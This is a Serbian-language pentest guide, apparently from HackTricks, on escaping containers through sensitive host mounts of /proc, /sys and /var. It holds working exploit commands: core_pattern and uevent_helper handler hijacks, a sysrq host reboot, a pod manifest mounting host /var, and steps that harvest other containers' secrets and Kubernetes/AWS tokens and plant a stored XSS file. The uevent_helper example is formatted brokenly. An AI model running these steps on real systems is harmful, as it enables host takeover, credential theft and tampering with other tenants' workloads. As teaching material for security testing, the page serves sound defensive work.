# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

Izlaganje `/proc`, `/sys` i `/var` bez odgovarajuće izolacije prostora imena uvodi značajne bezbednosne rizike, uključujući povećanje napadačke površine i otkrivanje informacija. Ovi direktorijumi sadrže osetljive datoteke koje, ako su pogrešno konfigurisane ili pristupene od strane neovlašćenog korisnika, mogu dovesti do bekstva iz kontejnera, modifikacije hosta ili pružiti informacije koje pomažu daljim napadima. Na primer, pogrešno montiranje `-v /proc:/host/proc` može zaobići AppArmor zaštitu zbog svoje putanje, ostavljajući `/host/proc` nezaštićenim.

**Možete pronaći dodatne detalje o svakoj potencijalnoj ranjivosti u** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Vulnerabilities

### `/proc/sys`

Ovaj direktorijum omogućava pristup za modifikaciju kernel varijabli, obično putem `sysctl(2)`, i sadrži nekoliko poddirektorijuma od značaja:

#### **`/proc/sys/kernel/core_pattern`**

- Opisano u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Ako možete da pišete unutar ove datoteke, moguće je napisati cevi `|` praćene putanjom do programa ili skripte koja će biti izvršena nakon što dođe do kvara.
- Napadač može pronaći putanju unutar hosta do svog kontejnera izvršavajući `mount` i napisati putanju do binarne datoteke unutar svog kontejnerskog datotečnog sistema. Zatim, izazvati kvar programa kako bi naterao kernel da izvrši binarnu datoteku van kontejnera.

- **Primer testiranja i eksploatacije**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Proverite [ovaj post](https://pwning.systems/posts/escaping-containers-for-fun/) za više informacija.

Primer programa koji se ruši:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Detaljno u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Sadrži putanju do učitača kernel modula, koji se poziva za učitavanje kernel modula.
- **Primer provere pristupa**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Proveri pristup modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Referencirano u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Globalna zastavica koja kontroliše da li kernel panici ili poziva OOM killer kada dođe do OOM uslova.

#### **`/proc/sys/fs`**

- Prema [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), sadrži opcije i informacije o datotečnom sistemu.
- Pristup za pisanje može omogućiti razne napade uskraćivanja usluge protiv hosta.

#### **`/proc/sys/fs/binfmt_misc`**

- Omogućava registraciju interpretera za nenativne binarne formate na osnovu njihovog magičnog broja.
- Može dovesti do eskalacije privilegija ili pristupa root shell-u ako je `/proc/sys/fs/binfmt_misc/register` zapisiv.
- Relevantna eksploatacija i objašnjenje:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Detaljan tutorijal: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Ostalo u `/proc`

#### **`/proc/config.gz`**

- Može otkriti konfiguraciju kernela ako je `CONFIG_IKCONFIG_PROC` omogućeno.
- Korisno za napadače da identifikuju ranjivosti u aktivnom kernelu.

#### **`/proc/sysrq-trigger`**

- Omogućava pozivanje Sysrq komandi, potencijalno uzrokujući trenutne restartove sistema ili druge kritične akcije.
- **Primer restartovanja hosta**:

```bash
echo b > /proc/sysrq-trigger # Restartuje host
```

#### **`/proc/kmsg`**

- Izlaže poruke iz kernel ring bafera.
- Može pomoći u kernel eksploatacijama, curenjima adresa i pružiti osetljive informacije o sistemu.

#### **`/proc/kallsyms`**

- Lista kernel eksportovane simbole i njihove adrese.
- Osnovno za razvoj kernel eksploatacija, posebno za prevazilaženje KASLR-a.
- Informacije o adresama su ograničene kada je `kptr_restrict` postavljen na `1` ili `2`.
- Detalji u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfejs sa kernel memorijskim uređajem `/dev/mem`.
- Istorijski ranjiv na napade eskalacije privilegija.
- Više o [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Predstavlja fizičku memoriju sistema u ELF core formatu.
- Čitanje može otkriti sadržaj memorije host sistema i drugih kontejnera.
- Velika veličina datoteke može dovesti do problema sa čitanjem ili rušenja softvera.
- Detaljna upotreba u [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Alternativni interfejs za `/dev/kmem`, predstavlja kernel virtuelnu memoriju.
- Omogućava čitanje i pisanje, što omogućava direktnu modifikaciju kernel memorije.

#### **`/proc/mem`**

- Alternativni interfejs za `/dev/mem`, predstavlja fizičku memoriju.
- Omogućava čitanje i pisanje, modifikacija sve memorije zahteva rešavanje virtuelnih do fizičkih adresa.

#### **`/proc/sched_debug`**

- Vraća informacije o rasporedu procesa, zaobilazeći PID namespace zaštite.
- Izlaže imena procesa, ID-eve i cgroup identifikatore.

#### **`/proc/[pid]/mountinfo`**

- Pruža informacije o tačkama montiranja u namespace-u montiranja procesa.
- Izlaže lokaciju kontejnerskog `rootfs` ili slike.

### `/sys` Ranjivosti

#### **`/sys/kernel/uevent_helper`**

- Koristi se za rukovanje kernel uređajima `uevents`.
- Pisanje u `/sys/kernel/uevent_helper` može izvršiti proizvoljne skripte prilikom `uevent` okidača.
- **Primer za eksploataciju**: %%%bash

#### Kreira payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Pronalazi putanju hosta iz OverlayFS montiranja za kontejner

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Postavlja uevent_helper na maliciozni helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Okida uevent

echo change > /sys/class/mem/null/uevent

#### Čita izlaz

cat /output %%%

#### **`/sys/class/thermal`**

- Kontroliše postavke temperature, potencijalno uzrokujući DoS napade ili fizičku štetu.

#### **`/sys/kernel/vmcoreinfo`**

- Curi adrese kernela, potencijalno kompromitujući KASLR.

#### **`/sys/kernel/security`**

- Sadrži `securityfs` interfejs, omogućavajući konfiguraciju Linux Security Modules kao što je AppArmor.
- Pristup može omogućiti kontejneru da onemogući svoj MAC sistem.

#### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**

- Izlaže interfejse za interakciju sa EFI varijablama u NVRAM-u.
- Pogrešna konfiguracija ili eksploatacija može dovesti do "brick"-ovanih laptopova ili nebootabilnih host mašina.

#### **`/sys/kernel/debug`**

- `debugfs` nudi "bez pravila" interfejs za debagovanje kernela.
- Istorija sigurnosnih problema zbog svoje neograničene prirode.

### `/var` Ranjivosti

Hostova **/var** fascikla sadrži socket-e kontejnerskog runtime-a i datotečne sisteme kontejnera. Ako je ova fascikla montirana unutar kontejnera, taj kontejner će dobiti pristup za čitanje i pisanje do datotečnih sistema drugih kontejnera sa root privilegijama. Ovo se može zloupotrebiti za prebacivanje između kontejnera, uzrokovanje uskraćivanja usluge ili postavljanje backdoor-a u druge kontejnere i aplikacije koje se u njima izvršavaju.

#### Kubernetes

Ako je kontejner poput ovog raspoređen sa Kubernetes:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Unutar **pod-mounts-var-folder** kontejnera:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
XSS je postignut:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Napomena: kontejner NE zahteva restart ili bilo šta drugo. Sve promene napravljene putem montiranog **/var** foldera biće primenjene odmah.

Takođe možete zameniti konfiguracione datoteke, binarne datoteke, servise, datoteke aplikacija i shell profile kako biste postigli automatski (ili poluautomatski) RCE.

##### Pristup cloud kredencijalima

Kontejner može čitati K8s serviceaccount tokene ili AWS webidentity tokene što omogućava kontejneru da dobije neovlašćen pristup K8s ili cloud:
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

Eksploatacija u Dockeru (ili u Docker Compose implementacijama) je potpuno ista, osim što su obično datoteke drugih kontejnera dostupne pod drugačijom osnovnom putanjom:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Dakle, fajl sistemi su pod `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Napomena

Stvarne putanje mogu se razlikovati u različitim postavkama, zbog čega je najbolje da koristite **find** komandu da
pronađete datoteke drugih kontejnera i SA / web identitet tokene.

### Reference

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Razumevanje i učvršćivanje Linux kontejnera](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Zloupotreba privilegovanih i neprivilegovanih Linux kontejnera](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
